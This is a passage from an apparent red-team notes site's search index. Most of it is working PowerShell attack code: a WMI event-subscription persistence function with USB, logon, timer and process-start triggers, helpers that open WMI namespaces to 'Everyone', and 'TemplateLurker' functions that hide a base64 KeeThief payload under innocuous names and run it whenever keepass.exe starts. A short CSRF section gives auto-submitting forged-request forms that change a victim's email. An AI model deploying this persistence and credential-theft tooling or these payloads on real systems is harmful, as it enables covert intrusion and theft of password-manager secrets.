[Parameter(Mandatory = $True, ParameterSetName = 'ScriptInsertUSBSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptUserLogonSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptTimedSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptIntervalSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptProcessStartSet')]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $EventName,\n\n        [Parameter(Mandatory = $True, ParameterSetName = 'CommandTimedSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'LocalTimedSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptTimedSet')]\n        [Datetime]\n        [ValidateNotNullOrEmpty()]\n        $ExecutionTime,\n\n        [Parameter(Mandatory = $True, ParameterSetName = 'CommandIntervalSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'LocalIntervalSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptIntervalSet')]\n        [Int32]\n        [ValidateNotNullOrEmpty()]\n        $IntervalPeriod,\n\n        [Parameter(Mandatory = $True, ParameterSetName = 'LocalInsertUSBSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'LocalUserLogonSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'LocalTimedSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'LocalIntervalSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'LocalProcessStartSet')]\n        [ScriptBlock]\n        [ValidateNotNullOrEmpty()]\n        $LocalScriptBlock,\n\n        [Parameter(ParameterSetName = 'CommandUserLogonSet')]\n        [Parameter(ParameterSetName = 'LocalUserLogonSet')]\n        [Parameter(ParameterSetName = 'ScriptUserLogonSet')]\n        [ValidateSet('Interactive', 'Network')]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $LogonType,\n\n        [Parameter(Mandatory = $True, ParameterSetName = 'CommandProcessStartSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'LocalProcessStartSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptProcessStartSet')]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $ProcessName,\n\n        [Parameter(Mandatory = $True, ParameterSetName = 'CommandInsertUSBSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'CommandUserLogonSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'CommandTimedSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'CommandIntervalSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'CommandProcessStartSet')]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $PermanentCommand,\n\n        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptInsertUSBSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptUserLogonSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptTimedSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptIntervalSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptProcessStartSet')]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $PermanentScript,\n\n        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptInsertUSBSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptUserLogonSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptTimedSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptIntervalSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptProcessStartSet')]\n        [ValidateSet('VBScript', 'JScript')]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $ScriptingEngine,\n\n        [Parameter(ParameterSetName = 'CommandTimedSet')]\n        [Parameter(ParameterSetName = 'CommandIntervalSet')]\n        [Parameter(ParameterSetName = 'LocalTimedSet')]\n        [Parameter(ParameterSetName = 'LocalIntervalSet')]\n        [Parameter(ParameterSetName = 'ScriptTimedSet')]\n        [Parameter(ParameterSetName = 'ScriptIntervalSet')]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $TimerId = 'WindowsTimer',\n\n        [Parameter(Mandatory = $True, ParameterSetName = 'LocalInsertUSBSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'LocalUserLogonSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'LocalTimedSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'LocalIntervalSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'LocalProcessStartSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'CommandInsertUSBSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'CommandUserLogonSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'CommandTimedSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'CommandIntervalSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'CommandProcessStartSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptInsertUSBSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptUserLogonSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptTimedSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptIntervalSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptProcessStartSet')]\n        [ValidateSet('InsertUSB', 'UserLogon', 'ProcessStart', 'Interval', 'Timed')]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Trigger,\n\n        [Parameter(Mandatory = $True, ParameterSetName = 'LocalUserLogonSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'CommandUserLogonSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptUserLogonSet')]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $UserName\n\n    )\n\n    #Build optional argument splat if a remote system is specified\n    $Arguments = @{}\n\n    if ($ComputerName){\n        $Arguments['ComputerName'] = $ComputerName\n        if ($Credential){\n            $Arguments['Credential'] = $Credential\n        }\n    }\n\n    Switch ($Trigger){\n        'InsertUSB' {$Query = 'SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2'}\n        'UserLogon' {\n            if ($UserName -eq 'any' -or $UserName -eq '*'){\n                $Query = \"SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'\"\n            }else{\n                $Query = \"SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser' AND TargetInstance.__RELPATH like `\"%$Domain%$UserName%`\"\"             \n            }\n        }\n        'Interval' {\n            Set-WmiInstance -class '__IntervalTimerInstruction' -Arguments @{ IntervalBetweenEvents = ($IntervalPeriod * 1000); TimerId = $TimerId } | Out-Null\n            $Query = \"Select * from __TimerEvent where TimerId = '$TimerId'\"\n        }\n        'Timed' {\n            Set-WmiInstance -class '__AbsoluteTimerInstruction' -Arguments @{ EventDatetime = [System.Management.ManagementDateTimeConverter]::ToDmtfDateTime($ExecutionTime); TimerId = $TimerId } | Out-Null\n            $Query = \"Select * from __TimerEvent where TimerId = '$TimerId'\"\n        }\n        'ProcessStart' {\n            $Query = \"SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='$ProcessName'\"\n        }\n        #'LockedScreen' {$Query = \"SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'LogonUI.exe'\"}\n    }\n\n    # Consumer Setup, query, and variable assignment\n    switch -Wildcard ($PsCmdlet.ParameterSetName) {\n\n        # Build Command Line Consumer object if -Command is used\n        'Command*' {\n            $CommandConsumerArgs = @{\n                Name = $EventName\n                CommandLineTemplate = $PermanentCommand\n            }\n            $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandConsumerArgs @Arguments\n\n            # Filter Setup, query, and variable assignment\n            $EventFilterArgs = @{\n                EventNamespace = 'root/cimv2'\n                Name = $EventName\n                Query = $Query\n                QueryLanguage = 'WQL'\n            }\n\n            $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs @Arguments\n\n            $FilterToConsumerArgs = @{\n                Filter = $Filter\n                Consumer = $Consumer\n            }\n\n            # Filter to Consumer Binding \n            Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs @Arguments | Out-Null\n        }\n        # Build Active Script Consumer object if -Script is used\n        'Script*' {\n            $ScriptConsumerArgs = @{\n                Name = $EventName\n                ScriptText = $PermanentScript\n                ScriptingEngine = $ScriptingEngine\n            }\n            $Consumer = Set-WmiInstance -Namespace root/subscription -Class ActiveScriptEventConsumer -Arguments $ScriptConsumerArgs @Arguments\n\n            # Filter Setup, query, and variable assignment\n            $EventFilterArgs = @{\n                EventNamespace = 'root/cimv2'\n                Name = $EventName\n                Query = $Query\n                QueryLanguage = 'WQL'\n            }\n\n            $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs @Arguments\n\n            $FilterToConsumerArgs = @{\n                Filter = $Filter\n                Consumer = $Consumer\n            }\n\n            # Filter to Consumer Binding \n            Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs @Arguments | Out-Null\n        }\n        # Build Local WMI Event\n        'Local*'{\n            $Arguments = @{\n                Query = $Query\n                Action = $LocalScriptBlock\n                SourceIdentifier = $EventName\n            }\n            Register-WmiEvent @Arguments\n        }\n    }\n}\n</code></pre>"},{"location":"notes/red/windows/70%25/persistence/persistence/#grant-wminamespaceread","title":"Grant-WmiNameSpaceRead","text":"<pre><code>function Grant-WmiNameSpaceRead {\n&lt;#\n    .SYNOPSIS\n\n        Grants remote read access to 'Everyone' for a given WMI namespace.\n        Access can be revoked with Revoke-WmiNameSpaceRead.\n        Heavily adapted from Steve Lee's example code on MSDN, originally licenses. \n        Taken from @enigma0x3's PowerSCCM (https://github.com/PowerShellMafia/PowerSCCM/blob/master/PowerSCCM.ps1).\n\n    .PARAMETER Namespace\n        Namespace to allow a read permission form.   \n    .PARAMETER ComputerName\n        The computer to grant read access to the specified namespace on.\n    .PARAMETER Credential\n        A [Management.Automation.PSCredential] object to use for the remote connection.\n    .EXAMPLE\n        PS C:\\&gt; Grant-WmiNameSpaceRead -NameSpace 'root\\Microsoft\\Windows'\n    .EXAMPLE\n        PS C:\\&gt; $Cred = Get-Credential\n        PS C:\\&gt; Grant-WmiNameSpaceRead -NameSpace 'root\\Microsoft\\Windows' -ComputerName sccm.testlab -Credential $Cred\n    .LINK\n        http://blogs.msdn.com/b/wmi/archive/2009/07/27/scripting-wmi-namespace-security-part-3-of-3.aspx\n        http://vniklas.djungeln.se/2012/08/22/set-up-non-admin-account-to-access-wmi-and-performance-data-remotely-with-powershell/\n#&gt;\n    [CmdletBinding()]\n    param(\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $NameSpace = 'root\\Microsoft\\Windows',\n\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $ComputerName = \".\",\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )    \n\n    # needed for non-DCs - add 'Everyone' to the 'Distributed COM Users' localgroup\n    $Group = [ADSI](\"WinNT://$ComputerName/Distributed COM Users,group\")\n\n    if ($PSBoundParameters.ContainsKey(\"Credential\")) {\n        $Params = @{Namespace=$Namespace; Path=\"__systemsecurity=@\"; ComputerName=$ComputerName; Credential=$Credential}\n\n        # alternate credentials for the adsi WinNT service provider\n        $Group.PsBase.Username = $Credential.Username\n        $Group.PsBase.Password = $Credential.GetNetworkCredential().Password\n    }\n    else {\n        $Params = @{Namespace=$Namespace; Path=\"__systemsecurity=@\"; ComputerName=$ComputerName}\n    }\n\n    try {\n        # actually add 'Everyone' to 'Distributed COM Users'\n        $Group.Add(\"WinNT://everyone,user\")\n    }\n    catch {\n        Write-Warning $_\n    }\n\n    $WmiObjectAcl = $(Invoke-WmiMethod -Name GetSecurityDescriptor @Params).Descriptor\n\n    # 33 = enable + remote access\n    $WmiAce = (New-Object System.Management.ManagementClass(\"win32_Ace\")).CreateInstance()\n    $WmiAce.AccessMask = 33\n    $WmiAce.AceFlags = 0\n\n    $WmiTrustee = (New-Object System.Management.ManagementClass(\"win32_Trustee\")).CreateInstance()\n\n    # sid of \"S-1-1-0\" = \"Everyone\"\n    $WmiTrustee.SidString = \"S-1-1-0\"\n    $WmiAce.Trustee = $WmiTrustee\n    $WmiAce.AceType = 0x0\n    $WmiObjectacl.DACL += $WmiAce.PSObject.ImmediateBaseObject\n\n    $Params += @{Name=\"SetSecurityDescriptor\"; ArgumentList=$WmiObjectAcl.PSObject.ImmediateBaseObject}\n    $Output = Invoke-WmiMethod @Params\n    if ($Output.ReturnValue -ne 0) {\n        throw \"SetSecurityDescriptor failed: $($Output.ReturnValue)\"\n    }\n}\n</code></pre>"},{"location":"notes/red/windows/70%25/persistence/persistence/#revoke-wminamespaceread","title":"Revoke-WmiNameSpaceRead","text":"<pre><code>function Revoke-WmiNameSpaceRead {\n&lt;#\n    .SYNOPSIS\n\n        Removes remote read access from 'Everyone' for a given WMI namespace that\n        was granted by Grant-WmiNameSpaceRead.\n        Heavily adapted from Steve Lee's example code on MSDN, originally licenses.\n        Taken from @enigma0x3's PowerSCCM (https://github.com/PowerShellMafia/PowerSCCM/blob/master/PowerSCCM.ps1).\n\n    .PARAMETER Namespace\n        Namespace to allow a read permission form.   \n    .PARAMETER ComputerName\n        The computer to revoke read access to the specified namespace on.\n    .PARAMETER Credential\n        A [Management.Automation.PSCredential] object to use for the remote connection.\n    .EXAMPLE\n        PS C:\\&gt; Revoke-WmiNameSpaceRead -NameSpace 'root\\Microsoft\\Windows'\n    .EXAMPLE\n        PS C:\\&gt; $Cred = Get-Credential\n        PS C:\\&gt; Revoke-WmiNameSpaceRead -NameSpace 'root\\Microsoft\\Windows' -ComputerName sccm.testlab -Credential $Cred\n    .LINK\n        http://blogs.msdn.com/b/wmi/archive/2009/07/27/scripting-wmi-namespace-security-part-3-of-3.aspx\n        http://vniklas.djungeln.se/2012/08/22/set-up-non-admin-account-to-access-wmi-and-performance-data-remotely-with-powershell/\n#&gt;\n    [CmdletBinding()]\n    param(\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $NameSpace = 'root\\Microsoft\\Windows',\n\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $ComputerName = \".\",\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )    \n\n    $Group = [ADSI](\"WinNT://$ComputerName/Distributed COM Users,group\")\n\n    if ($PSBoundParameters.ContainsKey(\"Credential\")) {\n        $Params = @{Namespace=$Namespace; Path=\"__systemsecurity=@\"; ComputerName=$ComputerName; Credential=$Credential}\n        $Group.PsBase.Username = $Credential.Username\n        $Group.PsBase.Password = $Credential.GetNetworkCredential().Password\n    }\n    else {\n        $Params = @{Namespace=$Namespace; Path=\"__systemsecurity=@\"; ComputerName=$ComputerName}\n    }\n\n    # remove 'Everyone' from the 'Distributed COM Users' local group on the remote server\n    $Group.Remove(\"WinNT://everyone,user\")\n\n    $WmiObjectAcl = $(Invoke-WmiMethod -Name GetSecurityDescriptor @Params).Descriptor\n\n    # remove the 'Everyone' ('S-1-1-0') DACL\n    $WmiObjectAcl.DACL = $WmiObjectAcl.DACL | Where-Object {$_.Trustee.SidString -ne 'S-1-1-0'} | ForEach-Object { $_.psobject.immediateBaseObject }\n\n    $Params += @{Name=\"SetSecurityDescriptor\"; ArgumentList=$WmiObjectAcl.PSObject.ImmediateBaseObject}\n    $Output = Invoke-WmiMethod @Params\n    if ($Output.ReturnValue -ne 0) {\n        throw \"SetSecurityDescriptor failed: $($Output.ReturnValue)\"\n    }\n}\n</code></pre>"},{"location":"notes/red/windows/70%25/persistence/persistence/#add-templatelurker","title":"Add-TemplateLurker","text":"<pre><code>function Add-TemplateLurker{\n\n&lt;#\n.SYNOPSIS\n\nAdds a permanent WMI event that utilizes either registry values or a custom WMI namespace and class to store encoded Powershell logic and its output.\n\n.DESCRIPTION\n\nAdd-TemplateLurker creates a permanent WMI event that will execute a provided payload when\n\nthe '&lt;processname&gt;' process starts. The payload, base64 Powershell logic, and its output are either stored in a custom WMI namespace and class or regsitry values. If a custom \nWMI namespace and class are selected, you have the option to expose that namespace so that it can be read remotely \nby 'Everyone'. Registry path and value names are customizable using the associated Parameters; however, this is optional as\ndefaults are set.\n\n.PARAMETER WMI\n\nIndicates that a custom WMI class will be used for data storage. \n\n.PARAMETER Registry\n\nIndicates that athe registry will be used for data storage. \n\n.PARAMETER ClassName\n\nIndicates the name of the custom WMI class. Defaults to 'WindowsUpdate'.\n\n.PARAMETER ExposeNamespace\n\nIndicates that the custom WMI namespace will be exposed so that 'Everyone' can read the custom WMI class properties remotely. \n\n.PARAMETER NamespaceName\n\nIndicates the name of the custome WMI namespace. Defaults to 'ROOT\\Software'.\n\n.PARAMETER PayloadValueName\n\nIndicates the name of the registry value used to store KeeThief logic. Defaults to 'DomainCertificate'.\n\n.PARAMETER OutputValueName\n\nIndicates the name of the registry value used to store KeeThief output. Defaults to 'ComputerCertificate'.\n\n.PARAMETER RegistryPath\n\nIndicates the name of the custome WMI class. Defaults to 'HKLM:\\SOFTWARE\\Microsoft\\SystemCertificates\\'.\n\n.PARAMETER EventName\n\nSpecifies the name to use for the WMI event. \n\n.EXAMPLE\n\nPS C:\\&gt;Add-TemplateLurker -EventName Lurker -WMI\n\nThis command will create a WMI event that uses a custom WMI class for storage.\n\n.EXAMPLE\n\nPS C:\\&gt;Add-TemplateLurker -EventName Lurker -Registry\n\nThis command will create a WMI event that uses the registry for storage.\n\n.EXAMPLE\n\nPS C:\\&gt;Add-TemplateLurker -EventName Lurker -WMI -NamespaceName root\\cimv2\\KeeThief -ExposeNamespace\n\nThis command will create a WMI event that uses a custom WMI class for storage at 'root\\cimv2\\KeeThief'. The data stored in this namespace\nwill be readable remotely by 'Everyone'\n#&gt;\n\n    Param (\n\n        [Parameter(ParameterSetName = 'WMI')]\n        [String]\n        $ClassName = 'WindowsUpdate',\n\n        [Parameter(Mandatory = $True, ParameterSetName = 'Registry')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'WMI')]\n        [String]\n        $EventName,\n\n        [Parameter(ParameterSetName = 'WMI')]\n        [Switch]\n        $ExposeNamespace,\n\n        [Parameter(ParameterSetName = 'WMI')]\n        [String]\n        $NamespaceName = 'root\\Software',\n\n        [Parameter(ParameterSetName = 'Registry')]\n        [String]\n        $OutputValueName = 'ComputerCertificate',\n\n        [Parameter(Mandatory = $True,ParameterSetName = 'Registry')]\n        [Switch]\n        $Registry,\n\n        [Parameter(ParameterSetName = 'Registry')]\n        [String]\n        $RegistryPath = \"HKLM:\\SOFTWARE\\Microsoft\\SystemCertificates\\\",\n\n        [Parameter(ParameterSetName = 'Registry')]\n        [String]\n        $PayloadValueName = 'DomainCertificate',\n\n        [Parameter(Mandatory = $True, ParameterSetName = 'WMI')]\n        [Switch]\n        $WMI\n\n    )\n\n    # Base64 encoded KeeThief functions\n    $Payload = \"&lt;INSERT VALUE&gt;\"\n\n    switch($PsCmdlet.ParameterSetName){\n        'WMI'{\n\n            # Create custome WMI namespace\n            $NSArray = $NamespaceName.Split('\\')\n            $Namespace = [wmiclass]\"$($NSArray[0..($NSArray.Length - 2)] -join '\\'):__namespace\"\n            $CustomNamespace = $Namespace.CreateInstance()\n            $CustomNamespace.Name = $NSArray[-1]\n            [void]$CustomNamespace.Put()\n\n            Write-Verbose \"Namespace $NamespaceName Created\"\n\n            # Expose namespace to 'Everyone' remotely\n            if($ExposeNamespace){\n                Grant-WmiNameSpaceRead -NameSpace $NamespaceName\n            }\n\n            # Create custom WMI class\n            $CustomClass = New-Object Management.ManagementClass(\"$NamespaceName\", $null, $null)\n            $CustomClass.Name = \"Win32_$ClassName\"\n            $CustomClass.Properties.Add('Content', $Payload)\n            $CustomClass.Put() | Out-Null\n\n            Write-Verbose \"Custom WMI Class Win32_$ClassName Created\"\n\n            # Logic that is executed after the event is triggered.\n            $ConsumerLogic= \n                \"`$CustomClass = Get-WmiObject -Namespace $NamespaceName -class Win32_$ClassName -List;\n                `$Payload = `$CustomClass.Properties['Content'].Value;\n                `$Output = Invoke-Expression -Command `$([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$Payload)));\n                `$OutputString = `$Output | Out-String;\n                `$EncodedOutput = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$OutputString));\n                `$CustomClass.Properties.Add('Output', `$EncodedOutput);\n                `$CustomClass.Put() | Out-Null\"\n\n            # Registering WMI event\n            Register-MaliciousWmiEvent -EventName $EventName -PermanentCommand $ConsumerLogic -Trigger ProcessStart -ProcessName keepass.exe | Out-Null\n            Write-Verbose \"WMI KeeTheifLurker '$EventName' Created.\"\n\n            # Cleanup command construction\n            $CleanupParameters = [System.Collections.ArrayList]@()\n            if($NamespaceName -ne 'Software'){\n                [void]$CleanupParameters.Add('-NamespaceName') \n                [void]$CleanupParameters.Add($NamespaceName)\n            }\n            if($ClassName -ne 'WindowsUpdate'){\n                [void]$CleanupParameters.Add('-ClassName')\n                [void]$CleanupParameters.Add($ClassName)\n            }\n            Write-Verbose \"Cleanup Command: \"\n            Write-Verbose \"Remove-TemplateLurker -EventName $EventName -WMI $($CleanupParameters)\"\n        }\n       'Registry'{\n\n            # Checking if provided registry path exists. It is created if it doesn't\n            if (!$RegistryPath){New-Item -Path $RegistryPath -Force | Out-Null}\n\n            # Create value that will hold KeeThief logic\n            New-ItemProperty -Path $RegistryPath -Name $PayloadValueName -Value $Payload -PropertyType MultiString -Force | Out-Null\n            Write-Verbose \"Registry Value $RegistryValueName Created At $RegistryPath\"\n\n            # Logic that is executed after the event is triggered\n            $ConsumerLogic=\n                \"`$RegistryPath = '$RegistryPath';\n                `$Payload = `$(Get-ItemProperty -Path `$RegistryPath -Name $PayloadValueName).$PayloadValueName;\n                `$Output = Invoke-Expression -Command `$([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$Payload)));\n                `$OutputString = `$Output | Out-String;\n                `$EncodedOutput = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$OutputString));\n                New-ItemProperty -Path `$RegistryPath -Name $OutputValueName -Value `$EncodedOutput -PropertyType MultiString -Force | Out-Null\"\n\n            # Registering WMI event\n            Register-MaliciousWmiEvent -EventName $EventName -PermanentCommand $ConsumerLogic -Trigger ProcessStart -ProcessName keepass.exe | Out-Null\n            Write-Verbose \"Registry KeeTheifLurker '$EventName' Created\"\n\n            # Cleanup command construction\n            $CleanupParameters = [System.Collections.ArrayList]@()\n            if($PayloadValueName -ne 'DomainCertificate'){\n                [void]$CleanupParameters.Add('-PayloadValueName') \n                [void]$CleanupParameters.Add($PayloadValueName)\n            }\n            if($OutputValueName -ne 'ComputerCertificate'){\n                [void]$CleanupParameters.Add('-OutputValueName')\n                [void]$CleanupParameters.Add($OutputValueName)\n            }\n            if($RegistryPath -ne 'HKLM:\\SOFTWARE\\Microsoft\\SystemCertificates\\'){\n                [void]$CleanupParameters.Add('-RegistryPath')\n                [void]$CleanupParameters.Add($RegistryPath)\n            }\n            Write-Verbose \"Cleanup Command: \"\n            Write-Verbose \"Remove-TemplateLurker -EventName $EventName -Registry $($CleanupParameters)\"\n        }\n    }\n\n\n}\n</code></pre>"},{"location":"notes/red/windows/70%25/persistence/persistence/#remove-templatelurker","title":"Remove-TemplateLurker","text":"<pre><code>function Remove-TemplateLurker{\n\n&lt;#\n.SYNOPSIS\n\nRemoves formerly added TemplateLurker.\n\n.DESCRIPTION\n\nRemove-TemplateLurker deletes the permanent WMI event and associated filter and consumer. It also removes registry or \nWMI storage components. In order to do this, the same arguments must be pass to this cmdlet as they were when creating\nthe TemplateLurker.\n\n.PARAMETER WMI\n\nIndicates that a custom WMI class was used for data storage. \n\n.PARAMETER Registry\n\nIndicates that the registry was used for data storage. \n\n.PARAMETER ClassName\n\nIndicates the a non-default WMI class name was specified.\n\n.PARAMETER ExposeNamespace\n\nIndicates the WMI namespace was exposed.\n\n.PARAMETER NamespaceName\n\nIndicates the a non-default WMI namespace name was specified.\n\n.PARAMETER PayloadValueName\n\nIndicates the a non-default registry payload value name was specified.\n\n.PARAMETER OutputValueName\n\nIndicates the a non-default registry output value name was specified.\n\n.PARAMETER RegistryPath\n\nIndicates the a non-default registry path was specified.\n\n.PARAMETER EventName\n\nSpecifies the name that was used for the WMI event. \n\n.EXAMPLE\n\nPS C:\\&gt;Remove-TemplateLurker -EventName Lurker -WMI\n\nThis command will remove the WMI event and the custom WMI namespace/class.\n\n.EXAMPLE\n\nPS C:\\&gt;Remove-TemplateLurker -EventName Lurker -Registry\n\nThis command will remove ther WMI event and the storage in registry.\n\n.EXAMPLE\n\nPS C:\\&gt;Remove-TemplateLurker -EventName Lurker -WMI -NamespaceName root\\cimv2\\KeeThief -ExposeNamespace\n\nThis command will remove the WMI event and the custom WMI namespace/class. Read access to 'Everyone' will\nbe revoked.\n#&gt;\n\n    Param (\n\n        [Parameter(ParameterSetName = 'WMI')]\n        [String]\n        $ClassName = 'WindowsUpdate',\n\n        [Parameter(Mandatory = $True, ParameterSetName = 'Registry')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'WMI')]\n        [String]\n        $EventName,\n\n        [Parameter(ParameterSetName = 'WMI')]\n        [Switch]\n        $ExposeNamespace,\n\n        [Parameter(ParameterSetName = 'WMI')]\n        [String]\n        $NamespaceName = 'ROOT\\Software',\n\n        [Parameter(ParameterSetName = 'Registry')]\n        [String]\n        $OutputValueName = 'ComputerCertificate',\n\n        [Parameter(Mandatory = $True,ParameterSetName = 'Registry')]\n        [Switch]\n        $Registry,\n\n        [Parameter(ParameterSetName = 'Registry')]\n        [String]\n        $RegistryPath = \"HKLM:\\SOFTWARE\\Microsoft\\SystemCertificates\\$Name\",\n\n        [Parameter(ParameterSetName = 'Registry')]\n        [String]\n        $PayloadValueName = 'DomainCertificate',\n\n        [Parameter(Mandatory = $True, ParameterSetName = 'WMI')]\n        [Switch]\n        $WMI\n\n    )\n\n    # Store payload\n    switch($PsCmdlet.ParameterSetName){\n        'WMI'{\n\n            # Remove custom WMI class\n            Get-WmiObject -class \"Win32_$ClassName\" -Namespace $NamespaceName | Remove-WmiObject\n            Write-Verbose \"Custom WMI Class Win32_$ClassName Deleted\"\n\n            # Remove custom WMI namespace\n            $NSArray = $NamespaceName.Split('\\')\n            Get-WmiObject -class __NAMESPACE -Namespace $($NSArray[0..($NSArray.Length - 2)] -join '\\') -Filter \"name='$($NSArray[-1])'\" | Remove-WmiObject\n            Write-Verbose \"Namespace $NamespaceName Deleted\"\n\n            # Revoke remote read access to custom namespace\n            if($ExposeNamespace){\n                Revoke-WmiNameSpaceRead -NameSpace $NamespaceName\n            }\n\n            # Remove WMI event\n            Get-WMIEvent -Name $EventName | Remove-WmiObject\n            Write-Verbose \"WMI KeeTheifLurker '$EventName' Deleted.\"\n        }\n       'Registry'{\n\n            $Key = Get-Item $RegistryPath \n            $Key | Remove-ItemProperty -Name $PayloadValueName \n            Write-Verbose \"Registry Value $PayloadValueName at $RegistryPath deleted\"\n            $Key | Remove-ItemProperty -Name $OutputValueName\n            Write-Verbose \"Registry Value $OutputValueName at $RegistryPath deleted\"\n\n            Get-WMIEvent -Name $EventName @Arguments | Remove-WmiObject\n            Write-Verbose \"Registry KeeTheifLurker '$EventName' Deleted\"\n\n        }\n    }\n\n}\n</code></pre>"},{"location":"notes/web/CSRF/","title":"CSRF","text":"<p>For a CSRF attack to be possible, three key conditions must be in place:</p> <ul> <li>A relevant action. There is an action within the application that the attacker has a reason to induce. </li> <li>Cookie-based session handling. Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests. There is no other mechanism in place for tracking sessions or validating user requests.</li> <li>No unpredictable request parameters. The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password.</li> </ul> <pre><code>&lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;\n&lt;form action=\"https://vuln.com/my-account/change-email\" method=\"POST\"&gt;\n  &lt;input type=\"hidden\" name=\"email\" value=\"anas&amp;#64;hana\" /&gt;\n  &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n&lt;/form&gt;\n    &lt;script&gt;document.forms[0].submit();&lt;/script&gt;\n</code></pre> <p>What if the website only allow uniq emails, i got you:</p> <pre><code>&lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;\n&lt;form id=\"emailForm\" action=\"https://vuln.com/change-email\" method=\"POST\"&gt;\n  &lt;input type=\"hidden\" id=\"emailField\" name=\"email\" /&gt;\n  &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n&lt;/form&gt;\n&lt;script&gt;\n  var uniqueID = Math.floor(Math.random() * 100000);\n  var email = \"anas\" + uniqueID + \"@hana\";\n  document.getElementById('emailField').value = email;\n  document.getElementById('emailForm').submit();\n&lt;/script&gt;\n</code></pre>"},{"location":"notes/web/CSRF/#defences","title":"Defences","text":""},{"location":"notes/web/CSRF/#referer-based-validation","title":"Referer-based validation","text":"<ul> <li>if it can be removed use  tag to delete the refere.</li> <li>or mybe it require to contain the word \"domain\" only then ? will be create.</li> </ul>"},{"location":"notes/web/CSRF/#csrf-tokens","title":"CSRF tokens","text":"<ul> <li>handle one method only mybe GET or POST \ud83e\udd74</li> <li>chack the token only if it exist !! wtf who will make that shit <code>skip the lab</code></li> <li>some one use the csrf like copns every copon can change one email <code>Why 